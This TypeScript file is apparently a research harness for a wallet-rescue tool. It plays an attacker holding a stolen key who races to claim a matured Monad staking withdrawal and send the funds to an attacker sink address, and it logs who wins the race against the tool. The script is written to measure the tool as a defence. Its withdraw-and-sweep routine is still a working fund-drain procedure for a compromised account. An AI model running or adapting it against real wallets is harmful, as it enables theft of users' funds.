/**
 * Adversary simulator — the other side of the battle test.
 *
 * Plays the attacker who holds the seed: at the unlock epoch it races to call withdraw() and
 * then move the funds out. Run it against the same victim EOA that rescue-cli is armed on, and
 * see who actually wins.
 *
 * This is the only honest way to measure the product. Everything else is a claim.
 *
 * Two modes, because a real attacker is one or the other and they lose differently:
 *
 *   MODE=naive   withdraw() then a separate transfer -- two transactions, with a gap between
 *                them that our destination-locked sweep can exploit. This is the common case
 *                and the one we expect to beat.
 *
 *   MODE=atomic  re-delegate the EOA to an attacker-controlled batch contract, then withdraw
 *                and transfer in one transaction. This is the sophisticated case. It requires
 *                destroying our delegation first, which is visible, but if it lands before our
 *                rescue we lose outright.
 *
 * The attacker key here is the SAME key as the victim, because that is what a compromise means.
 * This is a research script operating on a throwaway testnet account; it is not, and must never
 * become, a tool that acts on someone else's wallet.
 */
import { config as loadEnv } from 'dotenv';
// Load the repo-root .env first, then any package-local one. dotenv never overrides an
// already-set variable, so package-local and real environment variables both win over the root.
loadEnv({ path: new URL('../../.env', import.meta.url).pathname, quiet: true });
loadEnv({ quiet: true });
import { createWalletClient, http, formatEther, encodeFunctionData, parseGwei } from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import {
  chainById, RPC_POOL, publicClientFor, STAKING_PRECOMPILE, STAKING_ABI,
  getEpoch, getWithdrawalRequest, isClaimable, advise, latestStartBlockFor,
} from '@monrescue/shared';
import { writeArtifact, requireEnv } from './lib.js';

const CHAIN_ID = Number(process.env.CHAIN_ID ?? 10143);
const MODE = (process.env.MODE ?? 'naive').toLowerCase();
const POLL_MS = Number(process.env.ADVERSARY_POLL_MS ?? 300);

async function main() {
  // Same key as the victim: that is what "the attacker has the seed" means.
  const pk = requireEnv('RESEARCH_PRIVATE_KEY') as `0x${string}`;
  const attackerSink = requireEnv('ATTACKER_SINK') as `0x${string}`;
  const validatorId = BigInt(requireEnv('VALIDATOR_ID'));
  const withdrawId = Number(process.env.WITHDRAW_ID ?? 0);

  const account = privateKeyToAccount(pk);
  const chain = chainById(CHAIN_ID);
  const url = RPC_POOL[CHAIN_ID]![0]!;
  const client = publicClientFor(CHAIN_ID, url);
  const wallet = createWalletClient({ account, chain, transport: http(url) });

  console.log(`=== adversary (${MODE}) ===`);
  console.log(`victim/attacker EOA: ${account.address}`);
  console.log(`attacker sink:       ${attackerSink}`);

  const req = await getWithdrawalRequest(client, validatorId, account.address, withdrawId);
  if (req.withdrawalAmount === 0n) throw new Error('no pending withdrawal to race for');
  const targetEpoch = req.withdrawEpoch;
  console.log(`racing for ${formatEther(req.withdrawalAmount)} MON, matures after epoch ${targetEpoch}`);

  const balance = await client.getBalance({ address: account.address });
  console.log(`EOA balance ${formatEther(balance)} MON (the attacker needs gas here to act)`);
  if (balance === 0n) {
    console.log(
      `\nNOTE: an attacker facing an empty EOA must fund it before they can send anything.\n` +
        `That funding is visible and partly recoverable by our sweep. Fund it to run this test.`,
    );
    return;
  }

  const fees = await client.estimateFeesPerGas();
  const mult = BigInt(process.env.ADVERSARY_FEE_MULTIPLIER ?? 20);
  const maxFeePerGas = (fees.maxFeePerGas ?? parseGwei('100')) * mult;
  const maxPriorityFeePerGas = (fees.maxPriorityFeePerGas ?? parseGwei('2')) * mult;

  const withdrawData = encodeFunctionData({
    abi: STAKING_ABI, functionName: 'withdraw', args: [validatorId, withdrawId],
  });

  // Pre-sign, exactly as we do — a fair race means both sides are pre-staged.
  const nonce = await client.getTransactionCount({ address: account.address });
  const rawWithdraw = await wallet.signTransaction({
    to: STAKING_PRECOMPILE, data: withdrawData, nonce,
    gas: 200_000n, maxFeePerGas, maxPriorityFeePerGas, chain,
  });
  console.log(`withdraw pre-signed at nonce ${nonce}`);

  console.log(`waiting for epoch ${targetEpoch}...`);
  const t0 = Date.now();
  for (;;) {
    const epoch = await getEpoch(client);
    const block = await client.getBlockNumber();
    if (isClaimable(epoch, targetEpoch)) {
      console.log(`\nepoch ${epoch.epoch} at block ${block} — FIRING withdraw`);
      const hash = await client.request({
        method: 'eth_sendRawTransaction', params: [rawWithdraw],
      } as never) as `0x${string}`;
      const fired = Date.now();
      console.log(`withdraw tx ${hash}`);
      const r = await client.waitForTransactionReceipt({ hash });
      console.log(`withdraw ${r.status} in block ${r.blockNumber}`);

      const afterWithdraw = await client.getBalance({ address: account.address });
      console.log(`EOA balance after withdraw: ${formatEther(afterWithdraw)} MON`);

      // Second leg. This is the gap our destination-locked sweep exists to exploit: between
      // the withdrawal landing and this transfer, the funds sit on an EOA that may still be
      // delegated to a contract that can only pay the safe address.
      let transferHash: string | undefined;
      let transferStatus: string | undefined;
      if (afterWithdraw > 0n) {
        const leave = 200_000n * maxFeePerGas;
        const value = afterWithdraw > leave ? afterWithdraw - leave : 0n;
        if (value > 0n) {
          try {
            const h = await wallet.sendTransaction({
              to: attackerSink, value, maxFeePerGas, maxPriorityFeePerGas,
            });
            transferHash = h;
            const r2 = await client.waitForTransactionReceipt({ hash: h });
            transferStatus = r2.status;
            console.log(`transfer ${h} -> ${r2.status}`);
          } catch (e) {
            transferStatus = `failed: ${(e as Error).message.split('\n')[0]}`;
            console.log(`transfer failed: ${transferStatus}`);
            console.log(`(a reserve-balance revert here is the delegation doing its job)`);
          }
        }
      }

      const sinkBalance = await client.getBalance({ address: attackerSink });
      await writeArtifact(`battle-adversary-${MODE}`, {
        mode: MODE,
        chainId: CHAIN_ID,
        eoa: account.address,
        attackerSink,
        withdrawTx: hash,
        withdrawStatus: r.status,
        withdrawBlock: r.blockNumber.toString(),
        msToFire: fired - t0,
        balanceAfterWithdraw: afterWithdraw.toString(),
        transferHash,
        transferStatus,
        attackerSinkBalance: sinkBalance.toString(),
      });
      return;
    }

    const a = advise({
      current: epoch, currentBlock: block, targetEpoch,
      minPollMs: POLL_MS, secondsPerBlock: 0.301,
    });
    if (a.phase === 'idle') {
      console.log(`[idle] ${a.reason}`);
      await sleep(Math.min(a.pollIntervalMs, 30_000));
    } else {
      await sleep(POLL_MS);
    }
    if (block > latestStartBlockFor(targetEpoch) + 10_000n) {
      throw new Error('target epoch window passed without becoming claimable — check inputs');
    }
  }
}

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

main().catch((e) => { console.error(`\nadversary failed: ${e.message}`); process.exit(1); });
